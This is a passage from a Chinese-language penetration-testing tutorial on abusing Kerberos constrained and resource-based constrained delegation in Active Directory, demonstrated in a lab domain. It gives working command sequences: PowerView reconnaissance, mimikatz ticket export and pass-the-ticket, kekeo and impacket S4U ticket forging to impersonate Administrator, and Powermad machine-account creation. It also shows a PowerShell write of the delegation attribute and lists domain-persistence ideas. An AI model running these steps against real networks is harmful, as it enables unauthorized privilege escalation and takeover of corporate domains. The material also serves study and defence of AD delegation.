S4U2Self协议便是解决该问题的方案，
**被设置为约束性委派的服务能够调用S4U2Self向TGS为任意用户请求访问自身的可转发的服务票据，此后，便可通过S4U2Proxy使用这张TGS向域控制器请求访问B的票据。**  
PS:其实就是如果用户momo通过其他认证渠道过了服务器A的认证，那么服务器A就会通过S4U2Self协议让TGS生成一个momo访问它的ST（ST生成只需要服务账号密码的HASH），即前面的ST1。然后后面的流程都一样了。（常规的kerberos认证是用户需要向TGS证明自己的身份，而这里就是用户直接向服务A去证明自己的身份，不用管kerberos认不认，只要服务A认了就行）  
这里还是画个图给大家理解一下：
## 其中存在的问题与利用
从上面的S4U2Self(协议转换)我们可以看出，只要我们拿下一个配置了约束委派的服务账号，就可以利用这个服务账号代表任意用户进行S4U2self获得ST，然后把获取到的票据用于S42proxy，从而获取另一个服务的ST2，这样服务A就可以代替任意用户访问另外一个服务B(既被配置的约束委派的服务)。  
比如，如果服务B允许服务A被委派来控制它，我们在获取了服务A的权限下就可以伪造域管权限去访问它，从而获取服务B的权限。
首先我们给momo设置上约束委派权限（这里已经让momo注册了SPN，前面提过了），并且设置了momo这个服务账号对w2008这台机子的cifs服务的委派（cifs其实就是文件共享访问协议之类的）  
接着，我们就要尝试通过约束委派从momo这个账号的权限得到w2008的权限了。
首先，我们从发现约束性委派开始。如图，寻找域内的约束性委派服务账号，发现momo这个账号能委派w2008.ruyue.com的cifs服务。
    Get-DomainUser -TrustedToAuth -Properties distinguishedname,useraccountcontrol,msds-allowedto
    delegateto| fl
    Get-DomainComputer -TrustedToAuth -Properties distinguishedname,useraccountcontrol,msds-allowedtodelegateto|ft -Wrap -AutoSize //获取设置了约束性委派的机器账号
在想办法搞到momo这个账号的权限后，我们就可以先导出momo账号的TGT，
    sekurlsa::tickets /export
然后利用kekeo工具去使用S4U协议来伪造一个administartor请求服务B的ST2。
    tgs::s4u /tgt:[0;e6edd]PI:EMAIL /user:PI:EMAIL /service:cifs/w2008.ruyue.com
**PS：如果有momo这个服务账号的明文密码或者hash也是可以的，不是非要去读票据。**
最终在当前目录下得到两个票据文件，比较长那个就是用于访问服务B的ST2
把ST2导入当前会话，就能够成功以Administrator的权限访问服务B了。
    kerberos::ptt PI:EMAIL@RUYUE.COM_cifs~PI:EMAIL
# 资源型委派
 （原理透彻，推荐熟读并背诵）
## 原理
基于资源的约束委派(RBCD)是在Windows Server 2012中新加入的功能。传统的约束委派是“正向的”，通过修改服务A属性”msDS-AllowedToDelegateTo”，添加服务B的SPN（Service Principle
Name），设置约束委派对象（服务B），服务A便可以模拟用户向域控制器请求访问服务B以获得服务票据（TGS）来使用服务B的资源。  
而基于资源的约束委派则是相反的，通过修改服务B属性”msDS-AllowedToActOnBehalfOfOtherIdentity”，添加服务A的SPN，达到让服务A模拟用户访问B资源的目的。
从这里我们可以知道 **资源的约束委派并不能危害其他机子，只能对自己进行攻击，也就是说提权操作** 。（因为能够模拟其他用户的权限访问自己）
在利用之前，我们还需要了解资源约束委派的利用的前提：
  * 谁可以修改机子B的msDS-AllowedToActOnBehalfOfOtherIdentity属性。
  * 机子B具有一个SPN账号（因为S4U2Self只适用于具有SPN的账户）
我们比较关注第一个前提，谁能修改机子B的msDS-AllowedToActOnBehalfOfOtherIdentity属性，
通过下面这个文章就很清楚了，我感觉它写的已经很详细了，我没办法比它写的更详细易懂。
[https://blog.ateam.qianxin.com/post/wei-ruan-bu-ren-de-0day-zhi-yu-nei-ben-di-ti-quan-lan-fan-qie/#0x02-%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86](https://blog.ateam.qianxin.com/post/wei-ruan-bu-ren-de-0day-zhi-yu-nei-ben-di-ti-quan-lan-fan-qie/#0x02-基础知识)
**我们可以得知有两个用户有权限添加这个属性：①带着这台机子进入域的时候的域用户②该机子本身的机器账户。**
接着我们继续看第二个前提，具有一个SPN账号，我们知道注册SPN账号是需要域管权限的，显然一个普通域用户是没有权限去注册SPN的。
而恰好的是在域中有一个属性MachineAccountQuota，这个值表示的是允许用户在域中创建的计算机帐户数，默认为10，这意味着我们如果拥有一个普通的域用户那么我们就可以利用这个用户最多可以创建十个新的计算机帐户，而计算机账户默认是注册RestrictedKrbHost/domain和HOST/domain这两个SPN的，所以这里正好能够实现前提二。
因此带它进入域的域用户可以去创建一个新的机器账户来达到获取SPN的目的。
## 漏洞利用
### 利用场景
  * 提权：模拟其他用户访问自身，通过高权限利用mimikatz抓取本地密码。
  * 一个公司可能会有一个专门用来加域的账号，虽然这个账户通常只有普通域用户权限，但是如果我们控制了这个账户那么就可以打下一大批机器。
  * 如果我们想拿域内机器A的权限，如果我们又没有机器A administrators组成员凭据的话还可以看机器A是通过哪个用户加入域的，控制了这个用户依然可以获取权限。
  * 一个域用户X 可能会在域中创建多台机器(比如笔记本和台式机都需要加入域)，当我们有了域用户X的权限时，可以利用rbcd继续攻击其他mS-DS-CreatorSID是域用户X的机器
  * 权限维持：①配置evil到krbtgt基于资源的约束委派②配置evil到域控基于资源的约束委派。
### 查询哪台机子被谁带入域的
从上面的原理中我们得知，资源的约束委派不再需要域管理员权限去设置委派，只需拥有在计算机对象上  
编辑msDS-AllowedToActOnBehalfOfOtherIdentity属性的权限，也就是说：带它进入域的域用户或者机器账号的权限。  
所以我们第一步是先搞清楚是当前或者目标主机是被谁带入域的
这里我们完全可以用大佬写的工具去完成(自行编译)
如图，就可以看到test11这个机器是被momo带进域的。
如果不会编译也没关系，使用ADFind和PowerView来获取。
使用ADFind去查询每个域机器是由哪个域用户添加进域的，找到有mS-DS-CreatorSID的机器。
如下图，就只有TEST11是有这个属性的。也就是说TEST11这台主机是被S-1-5….这个SID对应的用户给带进域的。
    AdFind.exe -h 192.168.152.128 -b "DC=ruyue,DC=com" -f "objectClass=computer" mS-DS-CreatorSID
接着查看当前用户的，简单对比下，就可以知道momo这个账号有权限去修改TEST11的msDS-AllowedToActOnBehalfOfOtherIdentity属性，也就是说
利用momo这个账号可以在TEST11这台机子拿到最高权限。
    Get-DomainUser -Identity momo -Properties objectsid # 查询
### 提权利用
如果我们没有一个普通域账号，要想利用的话，就需要有机器账号，但一般情况下是没办法拿到机器账号的，但是所有低权限服务(例如network
service这类型的本机服务)如果可以请求域资源，那么出网都是以机器账户身份去请求的。所以我们就可以利用这个权限去进行资源委派的利用，模拟一个administrator访问自身，获取高权限。
如果我们有一个普通域账号（有权限修改msDS-AllowedToActOnBehalfOfOtherIdentity
属性），我们就可以利用这个账号去创建一个机器账号，再利用机器账号做资源委派利用，获取权限。  
攻击流程：
  * 利用域账号创建一个机器账号
  * 修改服务A的msDS-AllowedToActOnBehalfOfOtherIdentity ,配置好机器账号到服务的基于资源的约束委派。（服务A信任机器账号的委派）
  * 使用机器账号利用S4U2SELF 协议获得ST，再通过S4U2PROXY获得访问A cifs服务的ST2。（和约束委派差不多的流程）
  * 用ST2访问服务A的CIFS服务，获得权限。
#### Setp1 创建机器账号
首先我们在前面信息收集的时候得知了momo这个账号是能修改test11这台机子的msDS-AllowedToActOnBehalfOfOtherIdentity属性的。因此这里我们就利用  
momo这个域账号去先创建一个机器账号。  
使用 Powermad中的 New-MachineAccount 来创建机器账户，如图成功创建一个名为momomachine，密码为777777的机器账号。  
    New-MachineAccount -MachineAccount momomachine  -Password $(ConvertTo-SecureString "777777" -AsPlainText -Force)
#### Setp2 设置资源委派
前面我们创建了机器账号，也就是说成功注册了SPN，接着就可以设置momomachine到test11这台机子的委派了。
这里还是使用powerview去操作。
    Get-Netcomputer momomachine | select objectsid #获取机器账号的sid
    $SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-2955859873-908271592-1975121256-1710)"
    $SDBytes = New-Object byte[] ($SD.BinaryLength)
    $SD.GetBinaryForm($SDBytes, 0)
    Get-DomainComputer [目标主机名]| Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes} -Verbose
    Get-DomainComputer test11 -Properties msds-allowedtoactonbehalfofotheridentity #查看资源委派添加成功与否。
#### Setp3 利用资源委派进行提权
和约束委派差不多。因为当前机子test11信任了momomachine这个SPN的委派，所以我们就需要先获取这个SPN的
ST票据，可是这里我们没导出内存的权限，但别忘记了我们已经有密码了，没必要导出内存，直接用密码向KDC申请ST1，
并用这个ST1通过S4U协议来伪造一个administartor请求机器test11的ST2，从而实现提权就完事了。
PS:这里我还是不用rebeus来搞，毕竟这玩意需要目标机子有.NET环境。
这里我们使用impacket
    python3 getST.py -dc-ip 192.168.152.128 ruyue.com/momomachine\$:777777 -spn cifs/test11.ruyue.com -impersonate administrator
    export KRB5CCNAME=/usr/mytool/impacket/examples/administrator.ccache   
    python3 wmiexec.py test11.ruyue.com -no-pass -k -dc-ip 192.168.152.128
PS：wmiexec执行一些命令会乱码，所以可以用
    python3 psexec.py -k -no-pass test11.ruyue.com
#### Setp4 直接EXP完成Setp1和Setp2
前面的setp1和step2都可以利用工具完成，如下：
如图直接执行exp，就完成步骤1和2，接着只需要操作步骤3就完事了。